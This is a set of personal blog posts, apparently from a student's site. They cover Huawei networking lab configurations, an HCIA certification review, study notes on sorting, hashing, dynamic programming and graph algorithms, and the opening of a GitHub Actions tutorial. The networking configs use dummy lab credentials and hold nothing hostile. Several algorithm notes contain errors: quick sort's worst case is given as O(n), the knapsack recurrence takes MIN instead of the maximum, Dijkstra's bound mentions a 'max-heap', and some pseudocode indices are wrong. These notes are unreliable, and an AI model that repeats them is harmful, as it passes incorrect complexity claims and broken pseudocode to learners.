[{"content":"IP Routing R1\n1 2 3 4 5 6 7 8 9 10 11 ! Configure IP address int g0/0/1 ip address 192.168.0.254 24 quit int g0/0/0 ip address 10.0.0.1 30 quit ! Configure route ip route-static 192.168.1.0 24 g0/0/0 10.0.0.2 R2\n1 2 3 4 5 6 7 8 9 10 11 ! Configure IP address int g0/0/1 ip address 192.168.1.254 24 quit int g0/0/0 ip address 10.0.0.2 30 quit ! Configure route ip route-static 192.168.0.0 24 g0/0/0 10.0.0.1 PC1\n1 ip 192.168.0.1 255.255.255.0 192.168.0.254 PC2\n1 ip 192.168.1.1 255.255.255.0 192.168.1.254 Verify by pinging OSPF Basics R1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ! R1 is the DR ! This interface will face R2 int g0/0/1 ip address 192.168.1.1 24 undo shutdown quit ! Configure OSPF ospf 1 router-id 1.1.1.1 area 0 network 192.168.0.0 0.0.0.255 network 192.168.1.0 0.0.0.255 quit ! Set OSPF priority (Necessary in this case) int g0/0/1 ospf dr-priority 10 quit R2\n1 2 3 4 5 6 7 8 9 10 11 12 13 ! R2 is the BDR ! This interface will face R2 int g0/0/1 undo ip address ip address 192.168.1.2 24 undo shutdown quit ! Configure OSPF ospf 1 router-id 2.2.2.2 area 0 network 192.168.1.0 0.0.0.255 quit Output: Verify by pinging 192.168.0.2 from R2.\nInter-VLAN Communication Layer 3 Switch S1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ! Add VLAN vlan batch 10 20 ! Configure access ports int g1/0/1 port link-type access port default vlan 10 quit int g1/0/0 port link-type access port default vlan 20 quit ! Configure VLAN interface interface vlanif 10 ip address 192.168.0.1 24 quit interface vlanif 20 ip address 192.168.1.1 24 quit To verify, ping from PC2 to PC1\nROAS S1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 ! declare vlans vlan batch 10 20 99 ! Configure access ports int g1/0/0 port link-type access port default vlan 20 quit int g1/0/1 port link-type access port default vlan 10 quit ! Configure trunk port int g1/0/2 port link-type trunk port trunk allow-pass vlan 10 20 port trunk pvid vlan 99 quit R1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int g0/0/0 undo ip address quit ! Configure subinterface int g0/0/0.10 ip address 192.168.0.1 24 dot1q termination vid 10 arp broadcast enable quit int g0/0/0.20 ip address 192.168.1.1 24 dot1q termination vid 20 arp broadcast enable quit To verify\n1 2 3 4 5 6 7 8 PC1\u0026gt; ping 192.168.1.2 ping 192.168.1.2 84 bytes from 192.168.1.2 icmp_seq=1 ttl=63 time=4.934 ms 84 bytes from 192.168.1.2 icmp_seq=2 ttl=63 time=1.734 ms 84 bytes from 192.168.1.2 icmp_seq=3 ttl=63 time=2.006 ms 84 bytes from 192.168.1.2 icmp_seq=4 ttl=63 time=1.820 ms 84 bytes from 192.168.1.2 icmp_seq=5 ttl=63 time=1.477 ms ROAS (Hybrid) S1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ! declare vlans vlan batch 10 20 99 ! Configure access ports int g1/0/0 port link-type hybrid port hybrid pvid vlan 20 port hybrid untagged vlan 20 quit int g1/0/1 port link-type hybrid port hybrid pvid vlan 10 port hybrid untagged vlan 10 quit ! Configure trunk port int g1/0/2 port link-type hybrid port hybrid pvid vlan 99 port hybrid tagged vlan 10 20 quit R1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 int g0/0/0 undo ip address quit ! Configure subinterface int g0/0/0.10 ip address 192.168.0.1 24 dot1q termination vid 10 arp broadcast enable quit int g0/0/0.20 ip address 192.168.1.1 24 dot1q termination vid 20 arp broadcast enable quit To verify\n1 2 3 4 5 6 7 8 PC1\u0026gt; ping 192.168.1.2 ping 192.168.1.2 84 bytes from 192.168.1.2 icmp_seq=1 ttl=63 time=4.934 ms 84 bytes from 192.168.1.2 icmp_seq=2 ttl=63 time=1.734 ms 84 bytes from 192.168.1.2 icmp_seq=3 ttl=63 time=2.006 ms 84 bytes from 192.168.1.2 icmp_seq=4 ttl=63 time=1.820 ms 84 bytes from 192.168.1.2 icmp_seq=5 ttl=63 time=1.477 ms Eth-Trunk S1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 ! Enter eth-trunk interface config interface Eth-Trunk 1 ! Configure eth-trunk mode mode lacp-static ! Configure member interfaces ! My version of switch does not allow ranges trunkport g1/0/0 trunkport g1/0/1 trunkport g1/0/2 ! Configure switchport info for all int port link-type trunk port trunk pvid vlan 1 least active-linknumber 3 quit ! Configure LACP Actor lacp priority 65535 int g1/0/0 distribute-weight 3 int g1/0/1 distribute-weight 3 int g1/0/2 distribute-weight 3 int vlanif 1 ip address 192.168.0.1 24 quit S2\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ! Enter eth-trunk interface config interface Eth-Trunk 1 ! Configure eth-trunk mode mode lacp-static ! Configure member interfaces ! My version of switch does not allow ranges trunkport g1/0/0 trunkport g1/0/1 trunkport g1/0/2 ! Configure switchport info for all int port link-type trunk port trunk pvid vlan 1 least active-linknumber 3 quit int vlanif 1 ip address 192.168.0.2 24 quit To verify,\n1 [S1]display lacp statistics eth-trunk 1 You can also try pinging from S1 to S2. Access Control List Allow ping only R1\n1 2 3 4 5 6 7 8 9 10 11 acl 3000 ! Allow ping from 192.168.1.0/24 to 192.168.0.0/24 only rule permit icmp source 192.168.1.0 0.0.0.255 destination 192.168.0.0 0.0.0.255 ! Deny all packets to 192.168.0.0/24 rule deny ip source any destination 192.168.0.0 0.0.0.255 quit ! Apply on interface int g0/0/0 traffic-filter inbound acl 3000 quit AAA 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 int g0/0/0 ip address 192.168.0.2 24 quit aaa ! Create a local user local-user superman password cipher huawei123 ! This user can access via telnet local-user superman service-type telnet ! This user can also ping and whatnot local-user superman privilege level0 quit ! Start SSH server stelnet server enable !apply AAA on the VTY user-interface vty 0 4 authentication-mode aaa To verify, SSH into the server and see what commands are allowed. Network Address Translation Static NAT 1 2 3 4 5 6 7 8 9 10 ! Configure interfaces IP int g0/0/0 ip address 12.0.0.1 24 quit int g0/0/1 ip address 192.168.0.1 24 quit ! Configure NAT Pool nat To verify, on the ubuntu server, run sudo tcpdump -i ens3 icmp -n, then ping from PC1. As you can see, Ubuntu thinks that it received packets from 12.0.0.2.\nDynamic NAT 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ! Configure interfaces IP int g0/0/0 ip address 12.0.0.1 24 quit int g0/0/1 ip address 192.168.0.1 24 quit ! Configure NAT Pool nat address-group 1 12.0.0.3 12.0.0.10 ! Configure ACL acl 2000 rule permit source 192.168.0.0 0.0.0.255 quit ! Configure exit interface int g0/0/0 nat outbound 2000 address-group 1 no-pat quit To confirm,\n1 2 3 4 5 6 7 8 [Huawei]display nat outbound interface g0/0/0 NAT Outbound Information: -------------------------------------------------------------------------- Interface Acl Address-group/IP/Interface Type -------------------------------------------------------------------------- GigabitEthernet0/0/0 2000 1 no-pat -------------------------------------------------------------------------- Total : 1 To verify, on the ubuntu server, run sudo tcpdump -i ens3 icmp -n, then ping from PC1. As you can see, Ubuntu thinks that it received packets from 12.0.0.3.\nNAPT To configure NAPT, 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ! Configure interfaces IP int g0/0/0 ip address 12.0.0.1 24 quit int g0/0/1 ip address 192.168.0.1 24 quit ! Configure NAT Pool nat address-group 2 12.0.0.11 12.0.0.12 ! Configure ACL acl 2000 rule permit source 192.168.0.0 0.0.0.255 quit ! Configure exit interface int g0/0/0 nat outbound 2000 address-group 2 quit To verify the finding, on the ubuntu server, run sudo tcpdump -i ens3 icmp -n, then ping from PC1. Change the IP of the PC1 thrice. Easy IP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ! Configure interfaces IP int g0/0/0 ip address 12.0.0.1 24 quit int g0/0/1 ip address 192.168.0.1 24 quit ! Configure ACL acl 2000 rule permit source 192.168.0.0 0.0.0.255 quit ! Configure exit interface int g0/0/0 nat outbound 2000 quit int g0/0/0 undo nat outbound 2000 address-group 2 quit To verify, on the ubuntu server, run sudo tcpdump -i ens3 icmp -n, then ping from PC1. The server receives ICMP packets whose source IP address is that of the interface. Network Services FTP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 int g0/0/0 ip address 12.0.0.1 24 quit int Loopback 1 ip address 1.1.1.1 32 quit ! Solves \u0026#34;Error: Before enabling the service, configure the function of logging in to the device through a specified interface.\u0026#34; ftp server permit interface all ftp server-source -i Loopback 1 ftp server-source -a 1.1.1.1 ftp server enable aaa local-user john password irreversible-cipher john1234 local-user john service-type ftp local-user john privilege level 3 local-user john ftp-directory flash:/superman quit Output: Telnet 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 ! Configure interface int g0/0/0 ip address 12.0.0.1 24 quit int Loopback 1 ip address 1.1.1.1 32 quit ! Configure telnet Server telnet server permit interface all telnet server-source -a 1.1.1.1 telnet server-source -i Loopback 1 telnet server enable ! telnet server aaa local-user jack password irreversible-cipher jack1234 local-user jack service-type telnet local-user jack privilege level 3 quit Output: DHCP 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ! Enable DHCP dhcp enable ! Configure DHCP ip pool supercool network 12.0.0.0 mask 255.255.255.0 gateway-list 12.0.0.1 dns-list 8.8.8.8 quit ! Enable interface for DHCP int g0/0/0 dhcp select global quit Output: PPPOE R1 (Server)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 aaa local-user superman password cipher huawei123 local-user superman service-type ppp quit ip pool POOL1 network 192.168.0.0 mask 24 quit int virtual-template 1 ip address 192.168.0.254 24 remote address pool POOL1 ppp authentication-mode chap quit int g0/0/1 pppoe-server bind virtual-template 1 quit R2 (Client)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 dialer-rule dialer-rule 1 ip permit quit int dialer 1 dialer user superman dialer-group 1 dialer bundle 1 ppp chap user superman ppp chap password cipher huawei123 ip address ppp-negotiate quit int g0/0/1 pppoe-client dial-bundle-number 1 quit Verify\n1 2 3 4 [R2]display pppoe-client session summary PPPoE Client Session: ID Bundle Dialer Intf Client-MAC Server-MAC State 1 1 1 GE0/0/1 0ce6d0910001 0c27735f0001 UP Network Management and Operations and Maintenance SNMPv2c 1 2 3 4 5 6 7 8 9 int Loopback 1 ip address 1.1.1.1 32 quit snmp-agent //Start the SNMP agent service. snmp-agent sys-info version v2c //Set the SNMP version to v2c. snmp-agent mib-view included View_ALL iso //Create a MIB view View_ALL. snmp-agent community read cipher Public123 mib-view View_ALL //Configure a read community name and set the rights of the MIB view. snmp-agent protocol source-interface Loopback 1 //This step must be performed in V200R020 and later versions On the host,\n1 snmpwalk -v 2c -c Public123 1.1.1.1 Output: SNMPv3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 int Loopback 1 ip address 1.1.1.1 32 quit int g0/0/0 ip address 192.168.0.254 24 quit ! Enable SNMP version 3 snmp-agent sys-info version v3 ! Configure MIB view snmp-agent mib-view isoview include iso ! Configure the user group snmp-agent group v3 company_admin privacy read-view isoview write-view isoview notify-view isoview ! Configure user snmp-agent usm-user v3 superman group company_admin ! Configure authentication password (and hash) snmp-agent usm-user v3 superman authentication-mode sha ! (superman123) ! Configure sync encryption snmp-agent usm-user v3 superman privacy-mode aes128 ! superman1234 ! Configure admin contact info snmp-agent sys-info contact I just call to say I love you On the host,\n1 snmpwalk -u superman -a sha -A superman123 1.1.1.1 Output: To verify,\n1 \u0026lt;R1\u0026gt;display snmp-agent sys-info Output:\n1 2 3 4 5 6 7 8 The contact person for this managed node: I just call to say I love you The physical location of this node: Shenzhen China SNMP version running in the system: SNMPv3 and\n1 \u0026lt;R1\u0026gt;display snmp-agent usm-user Output:\n1 2 3 4 5 6 7 8 User name: superman Engine ID: 800007DB03000000000000 Group name: company_admin Authentication mode: sha, Privacy mode: aes128 Storage type: nonVolatile User status: active Total number is 1 IPv6 R1\n1 2 3 4 5 6 7 ipv6 int g0/0/0 ipv6 enable ipv6 address auto link-local ipv6 address 2001::1 64 quit R2\n1 2 3 4 5 6 7 ipv6 int g0/0/0 ipv6 enable ipv6 address auto link-local ipv6 address 2001::2 64 quit To verify\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 [R1]ping ipv6 2001::2 PING 2001::2 : 56 data bytes, press CTRL_C to break Reply from 2001::2 bytes=56 Sequence=1 hop limit=64 time = 8 ms Reply from 2001::2 bytes=56 Sequence=2 hop limit=64 time = 2 ms Reply from 2001::2 bytes=56 Sequence=3 hop limit=64 time = 1 ms Reply from 2001::2 bytes=56 Sequence=4 hop limit=64 time = 3 ms Reply from 2001::2 bytes=56 Sequence=5 hop limit=64 time = 2 ms --- 2001::2 ping statistics --- 5 packet(s) transmitted 5 packet(s) received 0.00% packet loss round-trip min/avg/max = 1/3/8 ms ","date":"2025-10-17T06:52:25-04:00","permalink":"https://trinuro.github.io/p/huawei-lab-fever/","title":"Huawei Lab Fever"},{"content":"Whassup people. Chronic Cert Collector here! Long story short, I recently got the Huawei Certified ICT Associate (HCIA) Datacom. Honestly, it was a refresh of CCNA topics, however, there are a few extra topics that is emphasised in HCIA Datacom but not CCNA, which I will get into later.\nGeneral Tips The information in Huawei ICT Academy is sufficient to pass the exam. A lab is not needed to pass (in my opinion), however, I highly recommend having labs because hands-on experience is absolutely invaluable. I hate memorizing commands. For those that come from Cisco background, familiarize yourself with the terms and commands used. Not everything is 1-to-1 with Cisco. Some interesting differences include: CCNA HCIA Default administrative distance of internal OSPF is higher than static route Default preference of internal OSPF is lower than that of static route No concept of \u0026ldquo;hybrid\u0026rdquo; ports. (At least at the CCNA level) Hybrid ports are taught, basically switchports that can forward more than one vlans untagged. PPP and PPPOE theory and configuration not emphasised. PPP and PPPOE theory and configuration are emphasised. WLAN not very emphasised. WLAN is very emphasised. Python Automation is not touched on. A bit of Python Automation. Conclusion Overall, I think this is an OK exam. However, would I have taken it if it wasn\u0026rsquo;t sponsored by my university? No. I think CCNA is better as it emphasised (a bit) more on practical skills and requires deeper knowledge.\nP.S. I love my prof in UM \u0026lt;3\n","date":"2025-10-17T04:52:25-04:00","permalink":"https://trinuro.github.io/p/hcia-datacom-certication/","title":"HCIA DataCom Certication"},{"content":"Merge Sort This algorithm is interesting as it has a worst and average case of O(nlogn) However, it is not in-place (Requires extra memory) It is stable too. (The relative position of two elements of the same value is the same before and after sorting.) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 MERGE-SORT(A,p,q) m = floor((p+q)/2) MERGE-SORT(A,p,m-1) MERGE-SORT(A,m,q) MERGE(A,p,q,m) MERGE(A,p,q,m) n1 = m-p n2 = q-m+1 Create an array, L[1..n1] Create an array, R[1..n2] L[1..n1] = A[p..m-1] R[1..n2] = A[m..q] j = 0 k = 0 for i in p to q if L[j] \u0026lt;= R[k] A[i] = L[j] j = j+1 else A[i] = R[k] k = k+1 Quick Sort Good all-purpose sorting algorithm In-place (Sorting is done without extra memory) Not stable It has an average case of O(nlogn) and a worst case of O(n) The algorithm 1 2 3 4 5 6 7 8 9 10 11 12 13 14 QUICK-SORT(A,p,q) m = PARTITION(A,p,q) QUICK-SORT(A,p,m-1) QUICK-SORT(A,m,q) PARTITION(A,p,q) u = A[q] // get the last element as pivot k = 0 for i in p to q-1 if A[i] \u0026lt; u // elements smaller than pivot will be to the left of pivot k = k+1 swap A[i] and A[k] Swap A[i] and A[k+1] // pivot will be between elements smaller than it and elements larger than it return k+1 // position of pivot In order to reduce the possibility of the worst case from happening, we should randomly choose the pivot. Counting sort The algo 1 2 3 4 5 6 7 8 9 10 11 counting-sort(A,B,k) let C[1..k] be a new list for i = 1 to k C[i] = 0 for j = 1 to A.length C[A[j]] = C[A[j]] + 1 for i = 1 to k C[i] = C[i]+C[i-1] for j = A.length downto 1 B[C[A[j]]] = A[j] C[A[j]] = C[A[j]] -1 Time complexity is O(n+k) It is very efficient if the range of elements is small and known Counting sort is stable. Radix Sort The algo 1 2 3 radix-sort(A,d) for i = 1 to d use a stable sort to sort array[A] on digit i Time complexity is O(n*k) where n is the number of elements and k is the number of radices. It is very efficient to sort integers with similar number of integers Bucket Sort 1 2 3 4 5 6 7 8 bucket-sort(A) n = A.length let B [0..n-1] be a new array for i = 0 to n-1 make B[i] an empty list for i = 1 to n insert A[i] into list B[|_n*A[i]_|] concatenate the lists B[0], B[1]...B[n-1] together in order Time complexity is theta(n)/O(n+k) where n is the number of elements and k is the number of buckets.\nShell Sort Algorithm 1 2 3 4 5 6 7 gaps = [x,y,z...] for each (G in gaps) create sub-arrays with elements having gap as G for each (S in sub-arrays) insertion_sort(s) merge all sub arrays gaps usually divides by 2 every iteration Does not have a fixed time complexity. Apparently, it is good for sorting with limited memory? ","date":"2025-07-15T23:59:30Z","permalink":"https://trinuro.github.io/p/writeups-on-sorting-algorithms/","title":"Writeups on Sorting Algorithms"},{"content":" Hash tables are interesting because they have an average time complexity of O(1) for most operations. In order words, for most cases, we can retrieve and insert data in the constant time. To insert data, we will convert the key into hash, then insert the key into the table. Table[hash(key)] = key Load factor is the ratio of the number of elements to number of slots in the table. The higher this ratio, the higher the probability of collision (Two elements have the same hash). Hash table operations (insert, retrieval) time complexity: Average case: O(1) Worst case: O(n) For hashing with chaining, O(1+alpha), where Alpha is the load factor Types of Hashes Modular hashes: H(k) = k mod q Multiplication hashes: H(k) = floor(q*(n*k mod 1)). Best way I can explain this is we multiply k by a fraction, n and gets the fraction (numbers after decimal point).. Then, we multiply it by a certain number and get a whole number. Cryptographic hashes: RSA etc Universal hashing: Create a set of hashes. Choose one to use randomly each time we need a hash. Hash collision Handling Methods Hash collisions refers to the situation where two data has the same hash. There are two ways to handle this Chaining: Each \u0026ldquo;slot\u0026rdquo; in the table is a linked list. Append the colliding elements to the linked list in table[hash] Open addressing: Find another spot in the table to insert the second element We can see some pros and cons immediately: Chaining: Pros: Handles collisions very well. Works even when number of elements is more than number of slots. Also should be used when we do not know how many keys will be inserted into the hash table Cons: More memory needed (Linked list needs to store the memory address of next node) Open addressing: Pros: Only one element per slot. More memory efficient. Probing In open addressing when collisions occur, we need to search for the next spot. This searching process is called probing. There are 3 probing methods available: Linear probe: Basically, add 1 to the original hash. For example, if the first hash is 7, next hash is 8, 9 etc Quadratic probe: Add c1*i+c2*i^2 to the original hash. For example, if the first hash is 4, next hash is 5, 8, 13 etc. (4+i^2) Double hashing: Formula is H(k) = h1(k)+i*h2(k) % m. We need a second auxiliary hash to calculate the next probe sequence. Double hashing is better than linear and quadratic probe because it provides a unique probe sequence for each colliding key. Just imagine, if 5 keys collide using linear/quadratic probing, the fifth key has to probe 5 times before reaching a place to put itself in However, there are two important criteria when using double hashing: Result of second hash cannot be zero. You will be forever stuck! Result of hash (H(k)) must be co-prime to the number of slots in the table Resizing hash table You might be wondering, chaining seems so much better. You may be right, if not for resizing hash table. Process of resizing hash table Double (more or less) the size of the hash table Recalculate the keys of each element in the table Insert the elements in the table You should resize the table when load factor is too high to maintain optimal performance. Personal Opinion The best hash table in my opinion is hash table with open addressing and double hashing. The hash used is universal hashing. Hash table resize occurs when load factor exceeds 0.7. Universal hashing means that we do not use the same hash every time. We create a collection of hashes and choose 1 to use randomly every time. Double hashing ensures two colliding keys have different probe sequence. ","date":"2025-07-15T23:57:16Z","permalink":"https://trinuro.github.io/p/writeup-on-hashing-algorithms/","title":"Writeup on Hashing Algorithms"},{"content":" Dynamic programming is programming paradigm that takes advantage of overlapping subprograms. It increases efficiency by answering the subproblems once and keeping the answers to overlapping subprograms. There are two approaches of dynamic programming Memoization: We store the answers of overlapping subprograms as we solve them. Tabulation: We calculates the answers of the overlapping subprograms first. There are a few problems that can be solved with DP: 0-1 Knapsack Problem Rod-cutting Problem Fibonacci Series Fibonacci Series This is a good problem to showcase the efficiency of dynamic programming To solve this series naively, we use this 1 2 3 4 FIB(n) if n\u0026lt;=1 return n return FIB(n-1)+FIB(n-2) Recursive tree of naive algorithm: ![[Pasted image 20250709205728.png]] As you can see many calculations are repeated. This is the so called \u0026ldquo;overlapping subproblem\u0026rdquo; For example, FIB(2) is repeated 3 times We can improve efficiency by storing the results of FIB(X) ![[Pasted image 20250709205942.png]] This method is called the memoization method in dynamic programming 1 2 3 4 5 6 7 8 9 10 11 12 13 FIB-MEMO(n) Create an array S[0..n] for i in 1 to n S[i] = -1 return FIB-AUX(n,S) FIB-AUX(n,S) if S[n] != -1: return S[n] // if S[n] is memorized if n\u0026lt;=1 return n S[n] = FIB-AUX(n-1,S) + FIB-AUX(n-2,S) // memorize the output of FIB(n) return S[n] The tabulation approach is slightly different. In this approach, we will precompute all the answers to subproblems 1 2 3 4 5 6 7 FIB(n) Create an array A[0..n] A[0] = 0 A[1] = 1 for i in 2 to n A[i] = A[i-1] + A[i-2] return A[n] Visualization\ni 0 1 2 3 4 5 6 \u0026hellip; n FIB(i) 0 1 1 2 3 5 8 …. 7. The naive approach to Fibonacci numbers has a time complexity of O(2^n) while the dynamic programming approach to Fibonacci numbers has a time complexity of O(n) Rod-Cutting Problem In this problem, we want to maximise the profit from a given length of rod. This is because the length of the rod is not proportional to the profit of the rod. Example: Say we have a Profit array of P = [3,5,1,9], where the profit of 1 unit length of rod is P[1] = 3 and so on. The length of the rod right now is 4 units. What is the best way to chop and sell this rod? The trick to solve this is to recursively find the maximum profit for rod length 1,2,3 and 4. 1 2 3 4 5 6 M[4] = MAX( P[4]+M[0], // no cut P[3]+M[1], // 3 unit + best cut for 1 unit P[2]+M[2], // 2 unit + best cut for 2 unit P[1]+M[3] // 1 unit + best cut for 3 unit ) To find the best cut of length 3,\n1 2 3 4 5 M[3] = MAX( P[3]+M[0], // no cut P[2]+M[1], // 3 unit + best cut for 1 unit P[1]+M[2], // 2 unit + best cut for 2 unit ) And so on. 4. The tabulation algorithm (n is the length of rod while P is the profit for each length of rod)\n1 2 3 4 5 6 7 8 9 ROD(n,P) Create an array M[0..n] M[0] = 0 for i in 1 to n q = - INF for j in 1 to i q = MAX(q, P[j]+ M[i-j]) M[i] = q return M[n] The memoization algorithm 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ROD(n,P) Create an array M[0..n] for i in 0 to n M[i] = -INF ROD-AUX(n,P,M) ROD-AUX(i,P,M) if M[i] != -INF return M[i] if i == 0 M[i] = 0 return M[i] q = -INF for j in 1 to i q = MAX(q, P[j]+ROD-AUX(i-j,P,M)) M[i] = q return M[i] 0-1 Knapsack Problem In this problem, we have n indivisible objects. We can only choose m objects out of n into our knapsack. We can only carry a max weight, w. Each object has a certain profit, P[i]. How do we pick these objects such that our profit is maximized? The naive approach is to test all possibilities. An object can be either in or outside the knapsack. (0 or 1) Thus, there is 2^n ways to choose objects. Find the profit of all the permutations. Reject the permutation that cause the knapsack to become overweight. The dynamic programming approach will stop the search at the maximum weight and avoid recalculating what is the highest profit at a certain weight value. (Kinda bad explanation, lul) The DP algorithm (Tabulation approach) 1 2 3 4 5 6 7 8 9 10 11 12 KNAPSACK(P,W,max) n = W.length Create a 2d array, M[0..n][0..max] for i in 0 to max M[0][i] = 0 // nothing has a profit of zero for i in 1 to n for j in 0 to max if j \u0026gt;= W[i] M[i][j] = MIN(M[i-1][j], M[i-1][j-W[i]]+P[i]) // ok, basically check if the previous set of objects or previous set of objects and the profit of current object is higher else M[i][j] = M[i-1][j] return M[n][max] Example P = {1,2,5,6}\nW = {2,3,4,5}\nMax weight = 8 P W i 0 1 2 3 4 5 6 7 8 0 0 i = 0 0 0 0 0 0 0 0 0 0 1 2 i = 1 0 0 1 1 1 1 1 1 1 2 3 i = 2 0 0 1 ==2== 2 3 3 3 3 5 4 i = 3 0 0 1 ==2== 5 5 6 7 7 6 5 i = 4 0 0 1 ==2== 5 6 6 7 ==8== Max-profit = 8 To backtrack which object is in the set, Notice that M[3][8] is 7 != 8. Thus, Item 4 must be in this set. Subtract P[4] from 8. We get 8-6=2. Follow the column with value in 2 Notice that M[1][3] is 1 != 2. Thus, Item 2 must be in this set.\nSet of item with maximum profit = {2,4}\n","date":"2025-07-15T23:46:39Z","permalink":"https://trinuro.github.io/p/writeup-on-dynamic-programming-algorithms/","title":"Writeup on Dynamic Programming Algorithms"},{"content":" In graph theory, there are four major types of problems: Searching: We want to find a node, n in the tree Minimum spanning tree: We want to find a way to connect all nodes in the cheapest way possible. Single source shortest path: We want to find the shortest path from a source node, u to every other node, v in the graph. All pairs shortest path: We want to find the shortest path from all nodes to every other nodes in the graph Searching algorithms There are two important search algorithms: Depth-first search (DFS) Breadth-first search (BFS) General differences: DFS uses stack while BFS uses queue DFS results in a \u0026ldquo;taller\u0026rdquo; tree while BFS results in a tree with more branches DFS Pseudocode 1 2 3 4 5 6 7 8 9 10 11 12 13 DFS(G,s) V = {} DFS-AUX(G,s,V) DFS-AUX(G,u,V) if u is in V return process(u) // print it, add it to a sum etc V = V U {u} for each vertex v that is neighbour of u if v is not in V DFS-AUX(G,v,V) BFS Pseudocode 1 2 3 4 5 6 7 8 9 10 11 12 BFS(G,s) V = {s} Create queue Q ENQUEUE(Q,s) while Q is not empty u = DEQUEUE(Q) process(u) // print it, add it to a sum etc for each vertex v that is a neighbour of u if v is not in V V = V U {v} ENQUEUE(Q,v) Minimum spanning tree Minimum spanning tree: Connected and acyclic graph in which the total weight of edges is the smallest Two ways to create MST: Prim\u0026rsquo;s algorithm Choose vertex Maintain one MST during building process Kruskal\u0026rsquo;s algorithm Choose edge Maintain one or more MST during building process Prim\u0026rsquo;s Algorithm Pseudocode 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PRIM(G,s) // initialise key and previous node for each vertex v in G.V: v.key = INF v.previous = NIL s.key=0 V = G.V while V is not empty: u = EXTRACT-MIN(V) // get node with lowest weight for each vertex v that is neighbour of u // adjust the key of all nodes if v is in V and v.key \u0026gt; w(u,v): v.key = w(u,v) v.previous = u Kruskal\u0026rsquo;s Algorithm Pseudocode 1 2 3 4 5 6 7 8 9 10 KRUSKAL(G) for each vertex v in G.V: MAKE-SET(v) // each vertex is its own tree Sort G.E in ascending order of weight // get edge with lowest weight each time S = {} for each edge (u,v) in G.E: if GET-SET(u) != GET-SET(v): // prevents merge of nodes from same tree UNION(u,v) // merge two trees S = S U {(u,v)} // add edge to output return S Both Prim and Kruskal have time complexity of O(ElogV) Single source shortest Path Objective is to find shortest path from current node, s to all other nodes Two algorithms are available: Dijkstra\u0026rsquo;s Cannot handle negative weights Better time complexity for positive weights than Bellman-Ford Bellman-Ford Can handle negative weights Both do not work if there exists a negative cycle Dijkstra\u0026rsquo;s algorithm pseudocode 1 2 3 4 5 6 7 DIJKSTRA(G,s,w) INITIALISE-SINGLE-SOURCE(G,s) V = G.V while V is not empty: u = EXTRACT-MIN(V) // Get the vertex with smallest weight every time for each vertex v that is neighbour of u: RELAX(u,v,w) Bellman-Ford algorithm Pseudocode 1 2 3 4 5 6 7 8 9 10 BELLMAN-FORD(G,s,w) INTIALISE-SINGLE-SOURCE(G,s) n = |G.V| for i in 1 to n-1 for each edge(u,v) in G.E RELAX(u,v,w) for each edge(u,v) in G.E if v.key \u0026gt; u.key+w(u,v) return FALSE // If negative cycle exist, the result is wrong return TRUE Helper algorithms 1 2 3 4 5 6 7 8 9 10 11 12 // Initialize all vertex to have nodes with impossible distance and no parent node, except source node INTIIALISE-SINGLE-SOURCE(G,s) for each vertex u in G.V u.key = INF u.previous = NIL s.key = 0 // Adjust the key of each node IF there is a better path to the node RELAX(u,v,w) if v.key \u0026gt; u.key+w(u,v) v.key = u.key+w(u,v) v.previous = u Time complexity of Dijkstra Without max-heap: O(V^2) With max-heap: O(ElogV) Time complexity of Bellman-Ford is O(VE) All Pairs Shortest Path Objective is for each pair of vertex, u and v, of the graph, find the shortest path between these two nodes Two algorithms: Johnson\u0026rsquo;s: Complex as heck, but better time complexity Floyd-Warshall Simple, uses matrices Johnson\u0026rsquo;s algorithm high level overview Add a new vertex to the graph and add edge to each existing vertex on the graph Apply Bellman-Ford algorithm and normalize the graph to remove all negative-weighted edges Remove the extra vertex in step 1 and apply Dijkstra\u0026rsquo;s on all original vertices. Floyd-Warshall algorithm pseudocode 1 2 3 4 5 6 7 8 9 10 FLOYD-WARSHALL(G,w) n = |G.V| Create a matrix nxn, D(0) D = G for i in 1 to n for j in 1 to n for k in 1 to n Create a new nxn matrix, D(i) D(i)[j][k] = MIN(D(i-1)[j][k], D(i-1)[j][i]+D(i-1)[i][k]) return D(n) Floyd-Warshall time complexity is O(V^3) Johnson\u0026rsquo;s algorithm time complexity is O(V^2 log V + VE) ","date":"2025-07-15T23:37:48Z","permalink":"https://trinuro.github.io/p/writeup-on-graph-algorithms/","title":"Writeup on Graph Algorithms"},{"content":"In this blog post, I would like to share a little about workflows on GitHub. In a nutshell, workflows allow you automate stuffs on GitHub, like continuous integration, continuous deployment, make bots that automatically comment on issues, make bots that automatically create pull requests from issues etc. This post contains a hands-on lab to follow along. You can view the completed code in this repository\nSet Up Fork the repository Clone the repository release v1. 1 2 3 4 5 6 7 8 git clone git@github.com:trinuro-organization/gha-ci-example-fork.git # change this cd .\\gha-ci-example-fork\\ # change this git remote add upstream https://github.com/trinuro/gha-ci-example git fetch --tags upstream git push --tags git checkout v1 git switch -c myBranch A quick test to see whether it works: 1 git branch Desired Output:\n1 2 main * myBranch Inside the repository, you will see 3 important files: example_module.py: Just a simple python module test_counting_sort.py and test_find_missing_number.py: Tests cases for said module Navigate to the the github 